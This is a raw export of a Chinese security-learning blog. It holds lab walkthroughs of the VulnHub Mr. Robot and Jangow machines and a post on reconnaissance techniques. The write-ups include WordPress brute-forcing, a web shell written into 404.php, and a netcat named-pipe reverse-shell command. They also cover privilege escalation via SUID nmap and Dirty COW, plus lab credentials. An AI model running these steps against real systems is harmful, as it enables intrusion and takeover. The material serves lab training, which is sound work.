src=\"https://img.freeaes.com/images/2021/12/03/4.png\" alt=\"4\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/5.png\" alt=\"5\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/6.png\" alt=\"6\"></p>\n<p>在目录遍历的过程中，我找到一个登录页，访问它，是一个WordPress程序，访问<code>wp-admin</code>路径并找到后台登录页。但我没有帐户密码。考虑到先前下载的<code>fsocity.dic</code>是一个字典文件，我可以用其进行暴力破解。<br><img src=\"https://img.freeaes.com/images/2021/12/03/7.png\" alt=\"7\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/8.png\" alt=\"8\"></p>\n<h2 id=\"暴力破解\"><a href=\"#暴力破解\" class=\"headerlink\" title=\"暴力破解\"></a>暴力破解</h2><p>在进行爆破前，我需要知道用户名是什么，我测试了几个常用的用户名，但均显示用户不存在，我觉得用户名应该也存在于刚才的字典内。然后添加变量为<code>user_login</code>参数。<br>首先打开BurpSuite并抓取数据包，将捕获的请求数据包发送到入侵模块。按清除按钮清除默认选择的变量。<br><img src=\"https://img.freeaes.com/images/2021/12/03/9.png\" alt=\"9\"><br>但我发现先前保存的字典有7点多mb大小。我想可能需要清除一些重复的字段。使用’cat fsocity.dic | sort-u&gt;fsocity’命令将重复的检查结果保存到文件fsocity，以看到，执行后的文件大小仅为95k。在Burp中导入字典。根据设备配置设置<code>resource pool</code>，然后start attack。<br><img src=\"https://img.freeaes.com/images/2021/12/03/10.png\" alt=\"10\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/11.png\" alt=\"11\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/12.png\" alt=\"11\"><br>破解后有三个用户名返回的包大小与其他包不一致，查看返回包，可以发现用户名存在，但无法向邮箱发送电子邮件（可能是配置问题），但并不妨碍我们进行下一步行动。<br><img src=\"https://img.freeaes.com/images/2021/12/03/13.png\" alt=\"13\"></p>\n<p>找到用户名，下一步是爆破密码。返回登录页面并获取包含登录信息的数据包。同样，将其发送到Intrude模块并清除默认变量。这一次，您需要添加两个变量<code>log</code>和<code>pwd</code>（因为要破解的用户名不是唯一的），并将攻击类型设置为Cluster bomb。将三个刚刚破解的用户名添加到payload1，并将fsocity.dic字典加载到payload2。设置resource pool后，start attack。<br><img src=\"https://img.freeaes.com/images/2021/12/03/14.png\" alt=\"14\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/15.png\" alt=\"15\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/16.png\" alt=\"16\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/17.png\" alt=\"17\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/18.png\" alt=\"18\"></p>\n<h2 id=\"上传Web-Shell\"><a href=\"#上传Web-Shell\" class=\"headerlink\" title=\"上传Web Shell\"></a>上传Web Shell</h2><p>暴力破解后，会得到三组用户名和密码（elliot/ER28-0652、elliot/ER28-0652、elliot/ER28-0652）。三组密码都可以成功登录。使用其中一个登录到管理面板。<br><img src=\"https://img.freeaes.com/images/2021/12/03/19.png\" alt=\"19\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/20.png\" alt=\"20\"></p>\n<p>一般WordPress可以在appearance的editor子项中编辑PHP文件。我们可以通过修改404.php来写入WebShell。然后使用AntSwarm连接到WebShell(<a href=\"http://192.168.56.102/wp-content/themes/twentyfifteen/404.php\">http://192.168.56.102/wp-content/themes/twentyfifteen/404.php</a>)<br><img src=\"https://img.freeaes.com/images/2021/12/03/21.png\" alt=\"21\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/22.png\" alt=\"22\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/23.png\" alt=\"23\"></p>\n<p>在查看网站根目录中的文件时发现了三个可疑文件（License.txt、License.bk、you-will-never-guess-this-file-name.txt）。<code>License</code>本身并不可疑，但我不知道它为什么需要备份。<br><img src=\"https://img.freeaes.com/images/2021/12/03/24.png\" alt=\"24\"><br>通过检查文件内容，可以发现<code>license.bk</code>和<code>you will event this file name.txt</code>并没有什么问题，但文件<code>license.txt</code>中有一串经过Base64加密的密文。<br><img src=\"https://img.freeaes.com/images/2021/12/03/25.png\" alt=\"25\"></p>\n<p>通过使用工具解密，可以看出它只是刚刚爆破出来的WordPress网站的后台账号密码。<br><img src=\"https://img.freeaes.com/images/2021/12/03/26.png\" alt=\"26\"></p>\n<p>在查看用户的家目录时，我在robot用户的家目录中发现了两个文件。查看第一个文件时，系统将提示您权限不足。使用<code>ls</code>命令查看文件的所有者为robot，<code>Key-2-of-3.txt</code>只能由robot或root读取，但幸运的是，可以查看第二个文件。<br><img src=\"https://img.freeaes.com/images/2021/12/03/27.png\" alt=\"27\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/28.png\" alt=\"28\"></p>\n<p>查看<code>password.raw-md5</code>文件,返回一段字符串。判断它是一串MD5密文。通过网站解密，解密后的密文是<code>robot/abcdefghijklmnopqrstuvwxyz</code>，这应该是robot用户的帐户密码（解密时，我使用的第一个网站是<code>cmd5.com</code>，但我发现它居然需要付费才能查看。然后我使用了<code>somd5.com</code>，幸运的是，它比较良心，并没有向我收费）。<br><img src=\"https://img.freeaes.com/images/2021/12/03/29.png\" alt=\"29\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/30.png\" alt=\"30\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/31.png\" alt=\"31\"></p>\n<h2 id=\"生成TTY-Shell\"><a href=\"#生成TTY-Shell\" class=\"headerlink\" title=\"生成TTY Shell\"></a>生成TTY Shell</h2><p>现在已经拥有了robot的用户名和密码，可以直接登录到robot用户查看第二个key。但是，在webshell中直接使用<code>su</code>命令将返回错误，并且在先前扫描端口时并没有发现目标开启SSH或Telnet服务。所以我需要先创建一个反弹shell。<br><img src=\"https://img.freeaes.com/images/2021/12/03/32.png\" alt=\"32\"><br>在执行过程中，我尝试了几种方法，但都没有成功反弹。最后，我使用了<code>rm/tmp/f;mkfifo/tmp/f;cat/tmp/f | /bin/bash-i 2&gt;&amp;1 | nc 192.168.56.104 8848&gt;/tmp/f</code>命令成功执行。在执行该命令之前，您需要在攻击机打开一个终端并输入<code>nc-lvvp 8848</code>命令侦听来自目标机器的连接。<br><img src=\"https://img.freeaes.com/images/2021/12/04/33.jpg\" alt=\"33\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/34.png\" alt=\"34\"></p>\n<p>要切换到robot用户，我需要生成一个TTY会话，并使用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>命令生成TTY Shell。然后使用刚刚解密的密码通过<code>su</code>命令切换用户，并查看robot家目录下的第二个密钥。<br><img src=\"https://img.freeaes.com/images/2021/12/03/35.png\" alt=\"35\"></p>\n<h2 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h2><p>剩下最后一个key，使用<code>find / -name key-*.txt 2&gt;/dev/null</code>命令扫描整个系统。但是，由于权限不足，甚至找不到第一个key，考虑提权。<br><img src=\"https://img.freeaes.com/images/2021/12/03/36.png\" alt=\"36\"></p>\n<p>使用<code>find / -perm -04000 2&gt;/dev/null</code>命令在系统中查找具有<code>suid</code>权限的文件列表。找到<code>nmap</code>命令并查看其版本信息。5.2.0版之前的Nmap具有交互功能，可用于提权。幸运的是，这个版本是3.8.1，符合版本。<br><img src=\"https://img.freeaes.com/images/2021/12/03/37.png\" alt=\"37\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/38.png\" alt=\"38\"></p>\n<p>执行<code>nmap --interactive</code>命令进入交互模式并输入<code>!sh</code>打开了一个shell。当检查用户的身份时，可以发现它正在以root用户身份运行。<br><img src=\"https://img.freeaes.com/images/2021/12/03/39.png\" alt=\"39\"></p>\n<p>再次查找，在root目录中找到第三个key。直接查看该文件。<br><img src=\"https://img.freeaes.com/images/2021/12/03/40.png\" alt=\"40\"></p>\n<h2 id=\"Game-Over\"><a href=\"#Game-Over\" class=\"headerlink\" title=\"Game Over\"></a>Game Over</h2>"},{"title":"信息收集","date":"2021-10-09T06:16:37.000Z","cover":"https://img.freeaes.com/images/2021/09/05/3.jpg","_content":"\n## 什么是信息收集\n信息收集是对目标采取直接行动的第一阶段，信息收集包括搜索与系统相关的可用公共信息，并寻求利用这些信息的最佳方式。尽可能多地收集信息的目的是了解应用程序或系统的工作原理，以发现可以解决的安全漏洞。对于这个过程，我们有三种方法进行测试：信息收集分为主动信息收集、半自动信息收集和被动信息收集。在这个阶段，我们会获取有关开放端口、服务、应用程序版本、操作系统版本等信息\n\n### 主动信息收集\n**主动信息收集**很大几率会被目标察觉到，因为收集过程中攻击者和目标的接触频率很高，在收集阶段，攻击者会采用工具进行扫描，列举或扫描开放服务是否有安全漏洞，扫描目录、文件和服务器，将产生大量网络流量，很可能会触发目标的警报。\n### 半自动信息收集\n**半自动信息收集**，通过模拟正常网络流量和行为进行收集，也就意味着不能通过主动信息收集那样暴力搜索（枚举）网络上公开的文件和目录，但攻击者可以通过工具代理（例如将burpsuite、OWASP ZAP设置为浏览器代理，每个请求都通过工具进行分析）。或查询已发布的名称服务器（NS），获取其相关信息。\n### 被动信息收集\n**被动信息收集**，完全不能让目标检测到信息收集行为，过程中不能使用任何网络代理和工具向目标发起请求，只能像正常访问网站一样，意味着攻击者只能通过存档（例如第三方查询网站）中挖掘可用信息，但有时候存档并不能及时更新，所以挖掘到的信息也许不是最新的。但被动信息收集也可以通过社会工程学，从公共区域、公司内部人员身上收集可用信息。例如*公司联系人姓名*、*电话号码*、*电子邮件地址*、*公司位置*和*分支机构*。\n\n## Google Hacking\nGoogle Hacking是信息收集过程中很有用的一种技术，攻击者可以通过Google Hacking搜索语法来了解目标网站，语法包括但不限于以下几点\n* site：制定域名\n* inurl：URL中存在关键字的网页\n* intext：正文中存在关键字的网页\n* filetype：指定文件类型\n* intitle：标题中存在关键字的网页\n* link：和关键字网址做了链接的网页\n* info：查找指定站点的一些基本信息\n* cache：搜索Google里关于指定内容的缓存\n\n通过Google语法，你可以收集到管理员登陆页面、用户名和密码、脆弱实体、敏感文件、电子邮件列表等重要信息\n\n\n## DNS查找\nDNS名称服务器中的错误配置可能会导致安全漏洞\n\nDNS查找可以查询到创建每个域时链接到它的一组信息：IP地址、注册/创建日期、域名所有者、名称服务器、域可用性等。\n\n**Nslookup**是一个可以在Linux、Windows、Mac上运行的工具。它可用于执行正反DNS查找和查询DNS服务器\n使用`-type=mx`参数可以显示更多信息\n\n## ipconfig\n`ipconfig /displaydns`可以查询到DNS记录名称、记录类型、PTR记录、A主机记录、上线时间、数据长度，还有关于机器从上次建立缓存起访问过什么网站。\n\n\n","source":"_posts/2021-10-09.md","raw":"---\ntitle: 信息收集\ndate: 2021-10-09 14:16:37\ntags:\n- 信息收集\ncategories: 学习笔记\ncover:  https://img.freeaes.com/images/2021/09/05/3.jpg\n---\n\n## 什么是信息收集\n信息收集是对目标采取直接行动的第一阶段，信息收集包括搜索与系统相关的可用公共信息，并寻求利用这些信息的最佳方式。尽可能多地收集信息的目的是了解应用程序或系统的工作原理，以发现可以解决的安全漏洞。对于这个过程，我们有三种方法进行测试：信息收集分为主动信息收集、半自动信息收集和被动信息收集。在这个阶段，我们会获取有关开放端口、服务、应用程序版本、操作系统版本等信息\n\n### 主动信息收集\n**主动信息收集**很大几率会被目标察觉到，因为收集过程中攻击者和目标的接触频率很高，在收集阶段，攻击者会采用工具进行扫描，列举或扫描开放服务是否有安全漏洞，扫描目录、文件和服务器，将产生大量网络流量，很可能会触发目标的警报。\n### 半自动信息收集\n**半自动信息收集**，通过模拟正常网络流量和行为进行收集，也就意味着不能通过主动信息收集那样暴力搜索（枚举）网络上公开的文件和目录，但攻击者可以通过工具代理（例如将burpsuite、OWASP ZAP设置为浏览器代理，每个请求都通过工具进行分析）。或查询已发布的名称服务器（NS），获取其相关信息。\n### 被动信息收集\n**被动信息收集**，完全不能让目标检测到信息收集行为，过程中不能使用任何网络代理和工具向目标发起请求，只能像正常访问网站一样，意味着攻击者只能通过存档（例如第三方查询网站）中挖掘可用信息，但有时候存档并不能及时更新，所以挖掘到的信息也许不是最新的。但被动信息收集也可以通过社会工程学，从公共区域、公司内部人员身上收集可用信息。例如*公司联系人姓名*、*电话号码*、*电子邮件地址*、*公司位置*和*分支机构*。\n\n## Google Hacking\nGoogle Hacking是信息收集过程中很有用的一种技术，攻击者可以通过Google Hacking搜索语法来了解目标网站，语法包括但不限于以下几点\n* site：制定域名\n* inurl：URL中存在关键字的网页\n* intext：正文中存在关键字的网页\n* filetype：指定文件类型\n* intitle：标题中存在关键字的网页\n* link：和关键字网址做了链接的网页\n* info：查找指定站点的一些基本信息\n* cache：搜索Google里关于指定内容的缓存\n\n通过Google语法，你可以收集到管理员登陆页面、用户名和密码、脆弱实体、敏感文件、电子邮件列表等重要信息\n\n\n## DNS查找\nDNS名称服务器中的错误配置可能会导致安全漏洞\n\nDNS查找可以查询到创建每个域时链接到它的一组信息：IP地址、注册/创建日期、域名所有者、名称服务器、域可用性等。\n\n**Nslookup**是一个可以在Linux、Windows、Mac上运行的工具。它可用于执行正反DNS查找和查询DNS服务器\n使用`-type=mx`参数可以显示更多信息\n\n## ipconfig\n`ipconfig /displaydns`可以查询到DNS记录名称、记录类型、PTR记录、A主机记录、上线时间、数据长度，还有关于机器从上次建立缓存起访问过什么网站。\n\n\n","slug":"2021-10-09","published":1,"updated":"2022-01-13T08:04:37.544Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckydsvihv0007uxf705j9f6wd","content":"<h2 id=\"什么是信息收集\"><a href=\"#什么是信息收集\" class=\"headerlink\" title=\"什么是信息收集\"></a>什么是信息收集</h2><p>信息收集是对目标采取直接行动的第一阶段，信息收集包括搜索与系统相关的可用公共信息，并寻求利用这些信息的最佳方式。尽可能多地收集信息的目的是了解应用程序或系统的工作原理，以发现可以解决的安全漏洞。对于这个过程，我们有三种方法进行测试：信息收集分为主动信息收集、半自动信息收集和被动信息收集。在这个阶段，我们会获取有关开放端口、服务、应用程序版本、操作系统版本等信息</p>\n<h3 id=\"主动信息收集\"><a href=\"#主动信息收集\" class=\"headerlink\" title=\"主动信息收集\"></a>主动信息收集</h3><p><strong>主动信息收集</strong>很大几率会被目标察觉到，因为收集过程中攻击者和目标的接触频率很高，在收集阶段，攻击者会采用工具进行扫描，列举或扫描开放服务是否有安全漏洞，扫描目录、文件和服务器，将产生大量网络流量，很可能会触发目标的警报。</p>\n<h3 id=\"半自动信息收集\"><a href=\"#半自动信息收集\" class=\"headerlink\" title=\"半自动信息收集\"></a>半自动信息收集</h3><p><strong>半自动信息收集</strong>，通过模拟正常网络流量和行为进行收集，也就意味着不能通过主动信息收集那样暴力搜索（枚举）网络上公开的文件和目录，但攻击者可以通过工具代理（例如将burpsuite、OWASP ZAP设置为浏览器代理，每个请求都通过工具进行分析）。或查询已发布的名称服务器（NS），获取其相关信息。</p>\n<h3 id=\"被动信息收集\"><a href=\"#被动信息收集\" class=\"headerlink\" title=\"被动信息收集\"></a>被动信息收集</h3><p><strong>被动信息收集</strong>，完全不能让目标检测到信息收集行为，过程中不能使用任何网络代理和工具向目标发起请求，只能像正常访问网站一样，意味着攻击者只能通过存档（例如第三方查询网站）中挖掘可用信息，但有时候存档并不能及时更新，所以挖掘到的信息也许不是最新的。但被动信息收集也可以通过社会工程学，从公共区域、公司内部人员身上收集可用信息。例如<em>公司联系人姓名</em>、<em>电话号码</em>、<em>电子邮件地址</em>、<em>公司位置</em>和<em>分支机构</em>。</p>\n<h2 id=\"Google-Hacking\"><a href=\"#Google-Hacking\" class=\"headerlink\" title=\"Google Hacking\"></a>Google Hacking</h2><p>Google Hacking是信息收集过程中很有用的一种技术，攻击者可以通过Google Hacking搜索语法来了解目标网站，语法包括但不限于以下几点</p>\n<ul>\n<li>site：制定域名</li>\n<li>inurl：URL中存在关键字的网页</li>\n<li>intext：正文中存在关键字的网页</li>\n<li>filetype：指定文件类型</li>\n<li>intitle：标题中存在关键字的网页</li>\n<li>link：和关键字网址做了链接的网页</li>\n<li>info：查找指定站点的一些基本信息</li>\n<li>cache：搜索Google里关于指定内容的缓存</li>\n</ul>\n<p>通过Google语法，你可以收集到管理员登陆页面、用户名和密码、脆弱实体、敏感文件、电子邮件列表等重要信息</p>\n<h2 id=\"DNS查找\"><a href=\"#DNS查找\" class=\"headerlink\" title=\"DNS查找\"></a>DNS查找</h2><p>DNS名称服务器中的错误配置可能会导致安全漏洞</p>\n<p>DNS查找可以查询到创建每个域时链接到它的一组信息：IP地址、注册/创建日期、域名所有者、名称服务器、域可用性等。</p>\n<p><strong>Nslookup</strong>是一个可以在Linux、Windows、Mac上运行的工具。它可用于执行正反DNS查找和查询DNS服务器<br>使用<code>-type=mx</code>参数可以显示更多信息</p>\n<h2 id=\"ipconfig\"><a href=\"#ipconfig\" class=\"headerlink\" title=\"ipconfig\"></a>ipconfig</h2><p><code>ipconfig /displaydns</code>可以查询到DNS记录名称、记录类型、PTR记录、A主机记录、上线时间、数据长度，还有关于机器从上次建立缓存起访问过什么网站。</p>\n","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"excerpt":"","more":"<h2 id=\"什么是信息收集\"><a href=\"#什么是信息收集\" class=\"headerlink\" title=\"什么是信息收集\"></a>什么是信息收集</h2><p>信息收集是对目标采取直接行动的第一阶段，信息收集包括搜索与系统相关的可用公共信息，并寻求利用这些信息的最佳方式。尽可能多地收集信息的目的是了解应用程序或系统的工作原理，以发现可以解决的安全漏洞。对于这个过程，我们有三种方法进行测试：信息收集分为主动信息收集、半自动信息收集和被动信息收集。在这个阶段，我们会获取有关开放端口、服务、应用程序版本、操作系统版本等信息</p>\n<h3 id=\"主动信息收集\"><a href=\"#主动信息收集\" class=\"headerlink\" title=\"主动信息收集\"></a>主动信息收集</h3><p><strong>主动信息收集</strong>很大几率会被目标察觉到，因为收集过程中攻击者和目标的接触频率很高，在收集阶段，攻击者会采用工具进行扫描，列举或扫描开放服务是否有安全漏洞，扫描目录、文件和服务器，将产生大量网络流量，很可能会触发目标的警报。</p>\n<h3 id=\"半自动信息收集\"><a href=\"#半自动信息收集\" class=\"headerlink\" title=\"半自动信息收集\"></a>半自动信息收集</h3><p><strong>半自动信息收集</strong>，通过模拟正常网络流量和行为进行收集，也就意味着不能通过主动信息收集那样暴力搜索（枚举）网络上公开的文件和目录，但攻击者可以通过工具代理（例如将burpsuite、OWASP ZAP设置为浏览器代理，每个请求都通过工具进行分析）。或查询已发布的名称服务器（NS），获取其相关信息。</p>\n<h3 id=\"被动信息收集\"><a href=\"#被动信息收集\" class=\"headerlink\" title=\"被动信息收集\"></a>被动信息收集</h3><p><strong>被动信息收集</strong>，完全不能让目标检测到信息收集行为，过程中不能使用任何网络代理和工具向目标发起请求，只能像正常访问网站一样，意味着攻击者只能通过存档（例如第三方查询网站）中挖掘可用信息，但有时候存档并不能及时更新，所以挖掘到的信息也许不是最新的。但被动信息收集也可以通过社会工程学，从公共区域、公司内部人员身上收集可用信息。例如<em>公司联系人姓名</em>、<em>电话号码</em>、<em>电子邮件地址</em>、<em>公司位置</em>和<em>分支机构</em>。</p>\n<h2 id=\"Google-Hacking\"><a href=\"#Google-Hacking\" class=\"headerlink\" title=\"Google Hacking\"></a>Google Hacking</h2><p>Google Hacking是信息收集过程中很有用的一种技术，攻击者可以通过Google Hacking搜索语法来了解目标网站，语法包括但不限于以下几点</p>\n<ul>\n<li>site：制定域名</li>\n<li>inurl：URL中存在关键字的网页</li>\n<li>intext：正文中存在关键字的网页</li>\n<li>filetype：指定文件类型</li>\n<li>intitle：标题中存在关键字的网页</li>\n<li>link：和关键字网址做了链接的网页</li>\n<li>info：查找指定站点的一些基本信息</li>\n<li>cache：搜索Google里关于指定内容的缓存</li>\n</ul>\n<p>通过Google语法，你可以收集到管理员登陆页面、用户名和密码、脆弱实体、敏感文件、电子邮件列表等重要信息</p>\n<h2 id=\"DNS查找\"><a href=\"#DNS查找\" class=\"headerlink\" title=\"DNS查找\"></a>DNS查找</h2><p>DNS名称服务器中的错误配置可能会导致安全漏洞</p>\n<p>DNS查找可以查询到创建每个域时链接到它的一组信息：IP地址、注册/创建日期、域名所有者、名称服务器、域可用性等。</p>\n<p><strong>Nslookup</strong>是一个可以在Linux、Windows、Mac上运行的工具。它可用于执行正反DNS查找和查询DNS服务器<br>使用<code>-type=mx</code>参数可以显示更多信息</p>\n<h2 id=\"ipconfig\"><a href=\"#ipconfig\" class=\"headerlink\" title=\"ipconfig\"></a>ipconfig</h2><p><code>ipconfig /displaydns</code>可以查询到DNS记录名称、记录类型、PTR记录、A主机记录、上线时间、数据长度，还有关于机器从上次建立缓存起访问过什么网站。</p>\n"},{"title":"VulnHub | Jangow 1.0.1","date":"2021-12-05T07:28:21.000Z","cover":"https://img.freeaes.com/images/2021/09/05/5.jpg","_content":"\n# Jangow 1.0.1\n\n## 项目地址\n[http://www.vulnhub.com/entry/jangow-101,754/](http://www.vulnhub.com/entry/jangow-101,754/)\n难度：Easy\n\n## 测试环境\n攻击机：Parrot 192.168.56.104\n目标靶机：Ubuntu 192.168.56.118\n\n## 信息收集\n开启目标靶机，登陆界面有其IP地址，不用自己手动扫描。但是还是要用nmap扫一下开启了什么端口。`sudo nmap -sS -n -p- 192.168.56.118`，然后使用`-sV`参数查看开放端口的详细信息。\n![0](https://img.freeaes.com/images/2021/12/05/0.png)\n![1](https://img.freeaes.com/images/2021/12/05/1.png)\n打开网页发现里面有一个站点目录，打开后貌似是一个静态页面站点，在查看`robots.txt`文件无果后使用`dirb`工具进行目录遍历。\n![2](https://img.freeaes.com/images/2021/12/05/2.png)\n![3](https://img.freeaes.com/images/2021/12/05/3.png)\n在遍历目录的过程中我尝试了一下有没有匿名登录，但是貌似并不行。\n![4](https://img.freeaes.com/images/2021/12/05/4.png)\n目录遍历并没有发现什么有用的信息，其中有一个wordpress目录，但是页面好像损坏了\n![5](https://img.freeaes.com/images/2021/12/05/5.png)\n那就只能在首页看看哪里能点点哪里了，其他都是一些描点或外部超链接，在尝试到`Buscar`的时候我发现它是一个php文件，URL地址栏中有显示需要传参，并且页面是空白的，怀疑是文件包含之类的漏洞.\n![6](https://img.freeaes.com/images/2021/12/05/6.png)\n经过测试发现是一个命令执行漏洞，输入`whoami`有回显信息。\n![7](https://img.freeaes.com/images/2021/12/05/7.png)\n\n## 漏洞利用\n我本来是想直接反弹一个shell，但是尝试了几种方法都不行，然后我通过python在攻击机本地建立了一个简单的web服务，然后在目标靶机使用`curl`命令访问我的网站，但是连接超时，在我的终端里也没有显示有访问请求，判断目标应该是设立了防火墙规则禁止出站流量，所以也就意味着只能在网站内执行命令\n![8](https://img.freeaes.com/images/2021/12/05/8.png)\n在查看文件的时候,我发现在上级目录下有一个隐藏文件,貌似是备份文件，打开是一个连接数据库的文件，但是目标也没开启3306，不过用户名是靶机名字，也许可以试试能不能登陆系统\n![9](https://img.freeaes.com/images/2021/12/05/9.png)\n![10](https://img.freeaes.com/images/2021/12/05/10.png)\n\n## 权限提升\n登陆机器，在当前用户家目录下发现一个`user.txt`文件，解密后是一个空密码，暂时还不知道有什么用，因为是普通用户，没有权限进入root目录，考虑提权，SUID提权试了一下不成功，但是`uname -a`看一下内核,内核版本是ubuntu4.4.0-31,可以使用脏牛本地提权.\n![11](https://img.freeaes.com/images/2021/12/05/11.png)\n![12](https://img.freeaes.com/images/2021/12/05/10.png)\n![13](https://img.freeaes.com/images/2021/12/05/10.png)\nDirty Cow适用于内核版本>=2.6.22的Linux，并且低于以下版本。\n```\nDebian 7          3.2.82-1\n\nDebian 8          3.16.36-1+deb8u2\n\nUbuntu 14.04      3.13.0-100.147\n\nUbuntu 16.04      4.4.0-45.66\n\nUbuntu 16.10      4.8.0-26.28\n\nCetnos6/RHEL6     2.6.32-642.6.2.el6\n\nCentos7 /RHEL7    3.10.0-327.36.3.el7\n\n```\n因为目标有防火墙限制，所以只能通过ftp上传payload，在攻击机下载并编译好payload，用`jangow01/abygurl69`登录ftp上传到家目录。\n![14](https://img.freeaes.com/images/2021/12/05/14.png)\n`chmod +x cowroot`给cowroot添加执行权限，然后直接运行。执行完后查看权限是root。\n![14](https://img.freeaes.com/images/2021/12/05/15.png)\n最后去root目录下，有一个`proof.txt`文件，应该就是这个靶机的Flag了。\n![16](https://img.freeaes.com/images/2021/12/05/16.png)\n","source":"_posts/2021-12-05.md","raw":"---\ntitle: VulnHub | Jangow 1.0.1\ndate: 2021-12-05 15:28:21\ncover: https://img.freeaes.com/images/2021/09/05/5.jpg\ntags:\n- VulnHub\n- Web 安全\ncategories: 学习笔记\n---\n\n# Jangow 1.0.1\n\n## 项目地址\n[http://www.vulnhub.com/entry/jangow-101,754/](http://www.vulnhub.com/entry/jangow-101,754/)\n难度：Easy\n\n## 测试环境\n攻击机：Parrot 192.168.56.104\n目标靶机：Ubuntu 192.168.56.118\n\n## 信息收集\n开启目标靶机，登陆界面有其IP地址，不用自己手动扫描。但是还是要用nmap扫一下开启了什么端口。`sudo nmap -sS -n -p- 192.168.56.118`，然后使用`-sV`参数查看开放端口的详细信息。\n![0](https://img.freeaes.com/images/2021/12/05/0.png)\n![1](https://img.freeaes.com/images/2021/12/05/1.png)\n打开网页发现里面有一个站点目录，打开后貌似是一个静态页面站点，在查看`robots.txt`文件无果后使用`dirb`工具进行目录遍历。\n![2](https://img.freeaes.com/images/2021/12/05/2.png)\n![3](https://img.freeaes.com/images/2021/12/05/3.png)\n在遍历目录的过程中我尝试了一下有没有匿名登录，但是貌似并不行。\n![4](https://img.freeaes.com/images/2021/12/05/4.png)\n目录遍历并没有发现什么有用的信息，其中有一个wordpress目录，但是页面好像损坏了\n![5](https://img.freeaes.com/images/2021/12/05/5.png)\n那就只能在首页看看哪里能点点哪里了，其他都是一些描点或外部超链接，在尝试到`Buscar`的时候我发现它是一个php文件，URL地址栏中有显示需要传参，并且页面是空白的，怀疑是文件包含之类的漏洞.\n![6](https://img.freeaes.com/images/2021/12/05/6.png)\n经过测试发现是一个命令执行漏洞，输入`whoami`有回显信息。\n![7](https://img.freeaes.com/images/2021/12/05/7.png)\n\n## 漏洞利用\n我本来是想直接反弹一个shell，但是尝试了几种方法都不行，然后我通过python在攻击机本地建立了一个简单的web服务，然后在目标靶机使用`curl`命令访问我的网站，但是连接超时，在我的终端里也没有显示有访问请求，判断目标应该是设立了防火墙规则禁止出站流量，所以也就意味着只能在网站内执行命令\n![8](https://img.freeaes.com/images/2021/12/05/8.png)\n在查看文件的时候,我发现在上级目录下有一个隐藏文件,貌似是备份文件，打开是一个连接数据库的文件，但是目标也没开启3306，不过用户名是靶机名字，也许可以试试能不能登陆系统\n![9](https://img.freeaes.com/images/2021/12/05/9.png)\n![10](https://img.freeaes.com/images/2021/12/05/10.png)\n\n## 权限提升\n登陆机器，在当前用户家目录下发现一个`user.txt`文件，解密后是一个空密码，暂时还不知道有什么用，因为是普通用户，没有权限进入root目录，考虑提权，SUID提权试了一下不成功，但是`uname -a`看一下内核,内核版本是ubuntu4.4.0-31,可以使用脏牛本地提权.\n![11](https://img.freeaes.com/images/2021/12/05/11.png)\n![12](https://img.freeaes.com/images/2021/12/05/10.png)\n![13](https://img.freeaes.com/images/2021/12/05/10.png)\nDirty Cow适用于内核版本>=2.6.22的Linux，并且低于以下版本。\n```\nDebian 7          3.2.82-1\n\nDebian 8          3.16.36-1+deb8u2\n\nUbuntu 14.04      3.13.0-100.147\n\nUbuntu 16.04      4.4.0-45.66\n\nUbuntu 16.10      4.8.0-26.28\n\nCetnos6/RHEL6     2.6.32-642.6.2.el6\n\nCentos7 /RHEL7    3.10.0-327.36.3.el7\n\n```\n因为目标有防火墙限制，所以只能通过ftp上传payload，在攻击机下载并编译好payload，用`jangow01/abygurl69`登录ftp上传到家目录。\n![14](https://img.freeaes.com/images/2021/12/05/14.png)\n`chmod +x cowroot`给cowroot添加执行权限，然后直接运行。执行完后查看权限是root。\n![14](https://img.freeaes.com/images/2021/12/05/15.png)\n最后去root目录下，有一个`proof.txt`文件，应该就是这个靶机的Flag了。\n![16](https://img.freeaes.com/images/2021/12/05/16.png)\n","slug":"2021-12-05","published":1,"updated":"2022-01-13T08:04:37.541Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckydsvii9000ouxf77biycbaz","content":"<h1 id=\"Jangow-1-0-1\"><a href=\"#Jangow-1-0-1\" class=\"headerlink\" title=\"Jangow 1.0.1\"></a>Jangow 1.0.1</h1><h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"http://www.vulnhub.com/entry/jangow-101,754/\">http://www.vulnhub.com/entry/jangow-101,754/</a><br>难度：Easy</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机：Parrot 192.168.56.104<br>目标靶机：Ubuntu 192.168.56.118</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>开启目标靶机，登陆界面有其IP地址，不用自己手动扫描。但是还是要用nmap扫一下开启了什么端口。<code>sudo nmap -sS -n -p- 192.168.56.118</code>，然后使用<code>-sV</code>参数查看开放端口的详细信息。<br><img src=\"https://img.freeaes.com/images/2021/12/05/0.png\" alt=\"0\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/1.png\" 